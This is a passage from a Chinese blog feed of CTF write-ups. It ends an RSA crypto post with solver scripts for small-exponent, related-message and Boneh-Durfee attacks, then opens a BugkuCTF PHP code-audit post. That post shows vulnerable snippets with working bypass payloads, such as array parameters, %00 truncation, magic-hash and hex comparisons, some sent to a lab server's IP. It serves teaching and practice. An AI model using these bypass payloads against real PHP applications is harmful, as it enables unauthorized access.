class="hljs-number">0x56a700d8f04da68c6cdb08e04a0cb2fa332389e10c1a3c94b220cb39144fc971c804ab02637303866040c13814194d863814453eec48db6136741d3a599cf890c678114b65dc60da2bbd29651bd0148f8949d69c4b18460ad0e1908eba384a1b51041e41caf70fed285fb34a8e56f04487d6d8b5d88f2a88d88565ef6757a697</span>ct_2=<span class="hljs-number">0x73e58f11dd9f637a7a7c05f6223ee95cb6d34a77583bfc6ca675955d51dd15ff4561654264e9985fcb2e87e3ddda7d6d7620cee80a1f2c20944d5d6f456a3e892f74b6745ddecbe3447825bf44344fc9e0839bdaebcca8352075675ffc8fee8c3698a87f3110f4004fea88c3faf05e5a527854e759e315b487b49e8ff9510cb</span>N_012 = n_0 * n_1 * n_2<span class="hljs-comment"># n1 * n2</span>m_s_0 = n_1 * n_2<span class="hljs-comment"># n0 * n2</span>m_s_1 = n_0 * n_2<span class="hljs-comment"># n0 * n1</span>m_s_2 = n_0 * n_1crt = libnum.solve_crt([ct_0,ct_1,ct_2], [n_0,n_1,n_2])c_0 = crt % n_0c_1 = crt % n_1c_2 = crt % n_2result = ((c_0 * m_s_0 * libnum.invmod(m_s_0, n_0)) + (c_1 * m_s_1 * libnum.invmod(m_s_1, n_1)) + (c_2 * m_s_2 * libnum.invmod(m_s_2, n_2))) % N_012pt = libnum.nroot(result, <span class="hljs-number">3</span>)<span class="hljs-keyword">print</span> libnum.n2s(pt).encode(<span class="hljs-string">'hex'</span>)<span class="hljs-comment">#380185242a03c9d6ca7a2e117490ebaf03a493b1250f4e248c732c2714eb6b9fd2fa4c90a4f1d8120ffbafb3b7fda85fff46a67a1da3e316392ec267e1fa7c27</span></code></pre><h3 id="challenge5-–-Related-Message-Attack">challenge5 – Related Message Attack<a class="post-anchor" href="#challenge5-–-Related-Message-Attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 4 completed[++++++++++++++++][+]Generating challenge 5[+]n=0x1bda683489ec09b15aa5ab9356db56e8586f03879e19bf4b2316b56332fd2d994ae8682d121373b21771eda5246b3565c52266e83bada43723bb8f4457d712f339d350d02bcd257923fb6b7ad265bafd4b9429943ba56f0d27b123962adf60b809f886a090e3472abe01e194dbc3ec1ecba2550d695e771d3f0edb9ada77f29L[+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0x22573b528e5ca137dc93b7f17f04d4efbf82124215a9c28ae6823fe5c7b6fb5eb5d328d9f6dbf73f88f59add74630d0721a822f8fb884b314f4c45aae1358fc8a19c59bbc370463541d58bd9cda1d77575a443cfbd85bdba48ae3e01642811a0b9824e3c8df8c02caed7a0606ceb6695dca7372e4291c60a98ed56b9442434L[+]x=pow(m+1,e,n)=0xe5ac2d53cd385143472febb8d7ba4acb7697bd494ef9ea0d165dd2ba7e451d803e45076ded5ef44bec0b72052b932348a50f0c66c6641159518f5137140a4db9fc497982930801715468932913e257f8b2abe287244d1d087c0ecf679cb46b1957bef678dee094d650a97d5a9d53cab80986571d890fbcd024528d6a321ac9L[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnum<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *n = <span class="hljs-number">0x1bda683489ec09b15aa5ab9356db56e8586f03879e19bf4b2316b56332fd2d994ae8682d121373b21771eda5246b3565c52266e83bada43723bb8f4457d712f339d350d02bcd257923fb6b7ad265bafd4b9429943ba56f0d27b123962adf60b809f886a090e3472abe01e194dbc3ec1ecba2550d695e771d3f0edb9ada77f29</span>e = <span class="hljs-number">3</span>c1 = <span class="hljs-number">0x22573b528e5ca137dc93b7f17f04d4efbf82124215a9c28ae6823fe5c7b6fb5eb5d328d9f6dbf73f88f59add74630d0721a822f8fb884b314f4c45aae1358fc8a19c59bbc370463541d58bd9cda1d77575a443cfbd85bdba48ae3e01642811a0b9824e3c8df8c02caed7a0606ceb6695dca7372e4291c60a98ed56b9442434</span>c2 = <span class="hljs-number">0xe5ac2d53cd385143472febb8d7ba4acb7697bd494ef9ea0d165dd2ba7e451d803e45076ded5ef44bec0b72052b932348a50f0c66c6641159518f5137140a4db9fc497982930801715468932913e257f8b2abe287244d1d087c0ecf679cb46b1957bef678dee094d650a97d5a9d53cab80986571d890fbcd024528d6a321ac9</span>a = <span class="hljs-number">1</span>b = <span class="hljs-number">-1</span>padding2 = <span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM2</span><span class="hljs-params">(a,b,c1,c2,n)</span>:</span>    a3 = pow(a,<span class="hljs-number">3</span>,n)    b3 = pow(b,<span class="hljs-number">3</span>,n)    first = c1-a3*c2+<span class="hljs-number">2</span>*b3    first = first % n    second = <span class="hljs-number">3</span>*b*(a3*c2-b3)    second = second % n    third = second*gmpy2.invert(first,n)    third = third % n    fourth = (third+b)*gmpy2.invert(a,n)    <span class="hljs-keyword">return</span> fourth % nm = getM2(a,b,c1,c2,n)-padding2<span class="hljs-keyword">print</span> <span class="hljs-string">"m==\n"</span> + hex(m) + <span class="hljs-string">"\n"</span><span class="hljs-comment">#print m</span>c = pow(m,e,n)<span class="hljs-comment">#print hex(c)</span><span class="hljs-keyword">if</span> c == c1:<span class="hljs-keyword">print</span> <span class="hljs-string">"yeah"</span></code></pre><h3 id="challenge6-–-Boneh-and-Durfee-attack">challenge6 – Boneh and Durfee attack<a class="post-anchor" href="#challenge6-–-Boneh-and-Durfee-attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 5 completed[++++++++++++++++][+]Generating challenge 6[+]n=0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L[+]d=random.getrandbits(1024*0.270)[+]e=invmod(d,phin)[+]hex(e)=0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><p>GitHub开源项目RSA-and-LLL-attacks<br>解密可得</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnume=<span class="hljs-number">3</span>n_0=<span class="hljs-number">0x9c94fecac76f9c5524d994d51efc1f02ad40fcf9cd5409d7c9f86a9f10e31b6c73d8bc02df743fea939acbcf9f81a748914fce0f8df1155c0f29faac38bd70b322eb7bc69c130720bdcb2ad2cbb84ad182b36e93170d81cb3a68969c850519e86b6a3676534cdbe85c9429c058230d58527d8028c134d6078cbb89faa071848f</span>ct_0=<span class="hljs-number">0x5e3b988abb38c33e145bbc16f56ec192253d26cc053d4f78e073d0d035eda4ea91f33ec7f7cd1a56165cae95a86e0a4edabb83743966b3a4621bb33753aec5fa4b1c6d80e0d404c19c6659c8ff6dc4f5539a5dbae659ca4f24f4c53a65c5c42bf9de04852c098841d2affe83c59be99b6ecd857e232cb008c657e1f55137bf06</span>n_1=<span class="hljs-number">0x409a8a39fcb302f0660f0a85b6d43636dce5b4797b6f3ef0b4972f70b6e0c74038c55ba50e0c918057e9ceaee024ae81da2faede8b5b66caae6892943a8892ad98b1f6f208b8b5ded753e6b8c6b94c5faf67314384f3f26e3dca579237893f098c90b0f8b80692aed4606947d656b74b69444ba0dc24b9c66a339f7a50f52783</span>ct_1=<span class="hljs-number">0xc5381d89ca5be27f43c30dbc395ce0d5b8a69adb80dc05d7f5d8dffc1b2fb76d2ab656f5659b9280c9cac83addcc0eb58e86f8e07a37f28b0500ab75bde4eb2b2e6631eeeb6bbe146c889b2ac6046864977aaee7292676fdbd4fb987940a83a94c3d04aef256b50d304d945528c69866acf591f914c0e50e012734827143ed7</span>n_2=<span class="hljs-number">0x56a700d8f04da68c6cdb08e04a0cb2fa332389e10c1a3c94b220cb39144fc971c804ab02637303866040c13814194d863814453eec48db6136741d3a599cf890c678114b65dc60da2bbd29651bd0148f8949d69c4b18460ad0e1908eba384a1b51041e41caf70fed285fb34a8e56f04487d6d8b5d88f2a88d88565ef6757a697</span>ct_2=<span class="hljs-number">0x73e58f11dd9f637a7a7c05f6223ee95cb6d34a77583bfc6ca675955d51dd15ff4561654264e9985fcb2e87e3ddda7d6d7620cee80a1f2c20944d5d6f456a3e892f74b6745ddecbe3447825bf44344fc9e0839bdaebcca8352075675ffc8fee8c3698a87f3110f4004fea88c3faf05e5a527854e759e315b487b49e8ff9510cb</span>N_012 = n_0 * n_1 * n_2<span class="hljs-comment"># n1 * n2</span>m_s_0 = n_1 * n_2<span class="hljs-comment"># n0 * n2</span>m_s_1 = n_0 * n_2<span class="hljs-comment"># n0 * n1</span>m_s_2 = n_0 * n_1crt = libnum.solve_crt([ct_0,ct_1,ct_2], [n_0,n_1,n_2])c_0 = crt % n_0c_1 = crt % n_1c_2 = crt % n_2result = ((c_0 * m_s_0 * libnum.invmod(m_s_0, n_0)) + (c_1 * m_s_1 * libnum.invmod(m_s_1, n_1)) + (c_2 * m_s_2 * libnum.invmod(m_s_2, n_2))) % N_012pt = libnum.nroot(result, <span class="hljs-number">3</span>)<span class="hljs-keyword">print</span> libnum.n2s(pt).encode(<span class="hljs-string">'hex'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM2</span><span class="hljs-params">(a,b,c1,c2,n)</span>:</span>    a3 = pow(a,<span class="hljs-number">3</span>,n)    b3 = pow(b,<span class="hljs-number">3</span>,n)    first = c1-a3*c2+<span class="hljs-number">2</span>*b3    first = first % n    second = <span class="hljs-number">3</span>*b*(a3*c2-b3)    second = second % n    third = second*gmpy2.invert(first,n)    third = third % n    fourth = (third+b)*gmpy2.invert(a,n)    <span class="hljs-keyword">return</span> fourth % nm = getM2(a,b,c1,c2,n)-padding2<span class="hljs-keyword">print</span> libnum.n2s(m)</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnum<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *n = <span class="hljs-number">0x1bda683489ec09b15aa5ab9356db56e8586f03879e19bf4b2316b56332fd2d994ae8682d121373b21771eda5246b3565c52266e83bada43723bb8f4457d712f339d350d02bcd257923fb6b7ad265bafd4b9429943ba56f0d27b123962adf60b809f886a090e3472abe01e194dbc3ec1ecba2550d695e771d3f0edb9ada77f29</span>e = <span class="hljs-number">3</span>c1 = <span class="hljs-number">0x22573b528e5ca137dc93b7f17f04d4efbf82124215a9c28ae6823fe5c7b6fb5eb5d328d9f6dbf73f88f59add74630d0721a822f8fb884b314f4c45aae1358fc8a19c59bbc370463541d58bd9cda1d77575a443cfbd85bdba48ae3e01642811a0b9824e3c8df8c02caed7a0606ceb6695dca7372e4291c60a98ed56b9442434</span>c2 = <span class="hljs-number">0xe5ac2d53cd385143472febb8d7ba4acb7697bd494ef9ea0d165dd2ba7e451d803e45076ded5ef44bec0b72052b932348a50f0c66c6641159518f5137140a4db9fc497982930801715468932913e257f8b2abe287244d1d087c0ecf679cb46b1957bef678dee094d650a97d5a9d53cab80986571d890fbcd024528d6a321ac9</span>a = <span class="hljs-number">1</span>b = <span class="hljs-number">-1</span>padding2 = <span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM2</span><span class="hljs-params">(a,b,c1,c2,n)</span>:</span>    a3 = pow(a,<span class="hljs-number">3</span>,n)    b3 = pow(b,<span class="hljs-number">3</span>,n)    first = c1-a3*c2+<span class="hljs-number">2</span>*b3    first = first % n    second = <span class="hljs-number">3</span>*b*(a3*c2-b3)    second = second % n    third = second*gmpy2.invert(first,n)    third = third % n    fourth = (third+b)*gmpy2.invert(a,n)    <span class="hljs-keyword">return</span> fourth % nm = getM2(a,b,c1,c2,n)-padding2<span class="hljs-keyword">print</span> long_to_bytes(m).encode(<span class="hljs-string">'hex'</span>)<span class="hljs-comment">#print m</span>c = pow(m,e,n)<span class="hljs-comment">#print hex(c)</span><span class="hljs-keyword">if</span> c == c1:<span class="hljs-keyword">print</span> <span class="hljs-string">"yeah"</span></code></pre><h2 id="参考链接">参考链接<a class="post-anchor" href="#参考链接"></a></h2><p><a href="http://www.realwz.com/2018/03/rsainctf.html" target="_blank" rel="noopener">http://www.realwz.com/2018/03/rsainctf.html</a><br><a href="http://inaz2.hatenablog.com/entry/2016/01/20/022936" target="_blank" rel="noopener">http://inaz2.hatenablog.com/entry/2016/01/20/022936</a><br><a href="https://findneo.github.io/180727rsa-attack/" target="_blank" rel="noopener">https://findneo.github.io/180727rsa-attack/</a><br><a href="https://www.cnblogs.com/WangAoBo/p/7541481.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/7541481.html</a><br><a href="https://code.felinae98.cn/ctf/crypto/rsa%e5%a4%a7%e7%a4%bc%e5%8c%85%ef%bc%88%e4%ba%8c%ef%bc%89coppersmith-%e7%9b%b8%e5%85%b3/" target="_blank" rel="noopener">https://code.felinae98.cn/ctf/crypto/rsa%e5%a4%a7%e7%a4%bc%e5%8c%85%ef%bc%88%e4%ba%8c%ef%bc%89coppersmith-%e7%9b%b8%e5%85%b3/</a><br><a href="https://www.anquanke.com/post/id/158944#h2-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158944#h2-4</a><br><a href="https://altman.vip/2018/07/23/RSA-STUDY/#0x06-Lattice-based-attacks-on-RSA" target="_blank" rel="noopener">https://altman.vip/2018/07/23/RSA-STUDY/#0x06-Lattice-based-attacks-on-RSA</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUGKUCTF-代码审计</title>
      <link href="/2019/07/13/BUGKUCTF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2019/07/13/BUGKUCTF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="extract变量覆盖">extract变量覆盖<a class="post-anchor" href="#extract变量覆盖"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag=<span class="hljs-string">'xxx'</span>;extract($_GET);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($shiyan))&#123;$content=trim(file_get_contents($flag));<span class="hljs-comment">#trim() 函数移除字符串两侧的空白字符或其他预定义字符。</span><span class="hljs-comment">#file_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。</span><span class="hljs-keyword">if</span>($shiyan==$content)&#123;<span class="hljs-keyword">echo</span><span class="hljs-string">'flag&#123;xxx&#125;'</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span><span class="hljs-string">'Oh.no'</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>extract()函数, 将GET方式获得的变量导入到当前的符号表中<br>如果变量shiyan和变量content的值相同，<br>就输出flag的值<br>否则就输出Oh,no<br>因为extract()会把符号表中已存在的变量名的值替换掉，所以Payload ：<code>?shiyan=&amp;content=</code></p><p>那么在使用函数extract()的时候, 如何防止这种漏洞呢<br>可以在使用的时候加上参数EXTR_SKIP<br>这个参数表示如果有冲突，不覆盖已有的变量<br>或者还有EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。</p><h3 id="strcmp比较字符串">strcmp比较字符串<a class="post-anchor" href="#strcmp比较字符串"></a></h3><p>源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag&#123;xxxxx&#125;"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>])) &#123;<span class="hljs-keyword">if</span> (strcmp($_GET[<span class="hljs-string">'a'</span>], $flag) == <span class="hljs-number">0</span>) <span class="hljs-comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><span class="hljs-comment">//比较两个字符串（区分大小写）</span><span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">'No'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>解这道题，就只要传入一个非字符串类型的变量即可，一般情况下，我们我们传数组，所以payload为：?a[]=123</p><h3 id="urldecode二次编码绕过">urldecode二次编码绕过<a class="post-anchor" href="#urldecode二次编码绕过"></a></h3><p>源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">"hackerDJ"</span>,$_GET[id]))<span class="hljs-comment">//eregi()函数在一个字符串搜索指定的模式的字符串</span>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-string">"not allowed!"</span>);<span class="hljs-keyword">exit</span>();&#125;$_GET[id] = urldecode($_GET[id]);<span class="hljs-keyword">if</span>($_GET[id] == <span class="hljs-string">"hackerDJ"</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"Access granted!"</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>就是需要构造get链接就可以得到答案：利用了两次urldecode第一次是浏览器的解码第二次是函数的解码</p><h3 id="md5-函数">md5()函数<a class="post-anchor" href="#md5-函数"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'username'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>])) &#123;<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'username'</span>] == $_GET[<span class="hljs-string">'password'</span>])<span class="hljs-keyword">print</span> <span class="hljs-string">'Your password can not be your username.'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">'username'</span>]) === md5($_GET[<span class="hljs-string">'password'</span>]))<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">'Invalid password'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><ul><li>松散比较：使用两个等号 == 比较，只比较值，不比较类型。</li><li>严格比较：用两个等号 === 比较，除了比较值，也比较类型。<br>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br>payload= <code>http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=0</code></li></ul><h3 id="数组返回NULL绕过">数组返回NULL绕过<a class="post-anchor" href="#数组返回NULL绕过"></a></h3><p>源码 <a href="http://123.206.87.240:9009/19.php" target="_blank" rel="noopener">题目地址</a></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>])) &#123;<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'--'</span>) !== <span class="hljs-keyword">FALSE</span>)<span class="hljs-comment">//查找 "--" 在字符串中第一次出现的位置</span><span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload<code>http://123.206.87.240:9009/19.php?password[]=1223</code>自己都搞不懂为什么<br>先来谈论一下标准的答案：<br>第一个条件：</p><ul><li>必须以数字或者字母开头（其实看到ereg就可以想到%00截断）</li></ul><p>第二个条件：</p><ul><li>必须在password参数中找到–。</li></ul><p>所以得出以下正解：<br><code>index.php?password=a%00--</code><br>那么话又说回来了，为什么直接password[]=a就可以绕过呢？<br>1.ereg只能处理字符，而你是数组，所以返回的是null，三个等号的时候不会进行类型转换。所以null不等于false。<br>2.strpos的参数同样不能够是数组，所以返回的依旧是null，null不等于false也是正确。<br>所以可以拿到flag</p><h3 id="弱类型整数大小比较绕过">弱类型整数大小比较绕过<a class="post-anchor" href="#弱类型整数大小比较绕过"></a></h3><p><a href="[http://123.206.87.240:9009/22.php]" title="http://123.206.87.240:9009/22.php">传送门</a></p><pre><code class="hljs php">$temp = $_GET[<span class="hljs-string">'password'</span>];is_numeric($temp)?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no numeric"</span>):<span class="hljs-keyword">NULL</span>;<span class="hljs-keyword">if</span>($temp&gt;<span class="hljs-number">1336</span>)&#123;<span class="hljs-keyword">echo</span> $flag;</code></pre><ul><li>payload<code>http://123.206.87.240:9009/22.php?password=1444a</code>还是不知道为什么…</li><li>payload<code>http://123.206.87.240:9009/22.php?password[]=1</code><br>PHP数组有一个缺陷就是大多数的函数都没有办法去判断数组。</li><li>payload<code>http://120.24.86.145:9009/22.php?password=2345%20</code>或者<code>http://120.24.86.145:9009/22.php?password=2345%00</code><br>is_numeric()函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断。</li></ul><h3 id="sha-函数比较绕过">sha()函数比较绕过<a class="post-anchor" href="#sha-函数比较绕过"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'name'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>]))&#123;var_dump($_GET[<span class="hljs-string">'name'</span>]);<span class="hljs-keyword">echo</span> <span class="hljs-string">""</span>;var_dump($_GET[<span class="hljs-string">'password'</span>]);var_dump(sha1($_GET[<span class="hljs-string">'name'</span>]));var_dump(sha1($_GET[<span class="hljs-string">'password'</span>]));<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'name'</span>] == $_GET[<span class="hljs-string">'password'</span>])<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your password can not be your name!'</span>;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">'name'</span>]) === sha1($_GET[<span class="hljs-string">'password'</span>]))<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password.'</span>;&#125;<span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">'Login first!'</span>;<span class="hljs-meta">?&gt;</span></code></pre><ul><li>payload<code>http://123.206.87.240:9009/7.php?name[]=1&amp;password[]=0</code></li></ul><p>利用sha1函数不能处理数组进行构造payload<br>代码审计需要满足三个条件：</p><ol><li>if (isset(GET[′name′])andisset(_GET[‘password’])) ==》TRUE<ol start="2"><li>if (GET[′name′]==_GET[‘password’]) ==》FALSE</li></ol></li><li>if sha1(GET[′name′])===sha1(_GET[‘password’])) ==》TRUE</li></ol><h3 id="md5加密相等绕过">md5加密相等绕过<a class="post-anchor" href="#md5加密相等绕过"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);$a = @$_GET[<span class="hljs-string">'a'</span>];$md52 = @md5($a);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag&#123;*&#125;"</span>;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload<code>http://123.206.87.240:9009/13.php?a=s878926199a</code>弱类型比较</p><h3 id="十六进制与数字比较">十六进制与数字比较<a class="post-anchor" href="#十六进制与数字比较"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span></span>&#123;$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;$one = ord(<span class="hljs-string">'1'</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>$nine = ord(<span class="hljs-string">'9'</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>$number = <span class="hljs-string">'3735929054'</span>;<span class="hljs-comment">// Check all the input characters!</span><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++)&#123;<span class="hljs-comment">// Disallow all the digits!</span>$digit = ord($temp&#123;$i&#125;);<span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;<span class="hljs-comment">// Aha, digit not allowed!</span><span class="hljs-keyword">return</span> <span class="hljs-string">"flase"</span>;&#125;&#125;<span class="hljs-keyword">if</span>($number == $temp)<span class="hljs-keyword">return</span> $flag;&#125;$temp = $_GET[<span class="hljs-string">'password'</span>];<span class="hljs-keyword">echo</span> noother_says_correct($temp);<span class="hljs-meta">?&gt;</span></code></pre><p>定义了一个function <code>noother_says_correct</code><br>首先分析代码，函数要求变量$temp不能存在1-9之间的数字，<br>最后，又要求$temp=3735929054;<br>这本来是自相矛盾的，但php在转码时会把16进制转化为十进制.于是把<br>3735929054转换成16进制为0xdeadc0de，记得带上0x；<br>构造payload<br><code>password=0xdeadc0de</code></p><h3 id="变量覆盖">变量覆盖<a class="post-anchor" href="#变量覆盖"></a></h3><p>服务器被覆盖了..</p><h3 id="0x11-ereg正则-00截断">0x11 - ereg正则%00截断<a class="post-anchor" href="#0x11-ereg正则-00截断"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"xxx"</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>]))&#123;<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen($_GET[<span class="hljs-string">'password'</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; $_GET[<span class="hljs-string">'password'</span>] &gt; <span class="hljs-number">9999999</span>)&#123;<span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'*-*'</span>) !== <span class="hljs-keyword">FALSE</span>) <span class="hljs-comment">//strpos — 查找字符串首次出现的位置</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-string">'- have not been found'</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><ol><li>if (ereg (“^[a-zA-Z0-9]+”,_GET[‘password’]) === FALSE)  ==》 FLASE</li><li>if (strlen(_GET[‘password’]) &lt; 8 &amp;&amp;_GET[‘password’] &gt; 9999999)    //正常感觉矛盾，但是可以利用科学计数法绕过1e8 &gt; 9999999</li><li>if (strpos ($_GET[‘password’], ‘<em>-</em>‘) !== FALSE)   //password的值应包含字符串’<em>-</em>‘<br>构造payload：<blockquote><p><code>http://123.206.87.240:9009/5.php?password=1e8%00*-*http://123.206.87.240:9009/5.php?password[]=</code></p></blockquote></li></ol><h3 id="strpos数组绕过">strpos数组绕过<a class="post-anchor" href="#strpos数组绕过"></a></h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">"flag"</span>;<span class="hljs-keyword">if</span> (<span 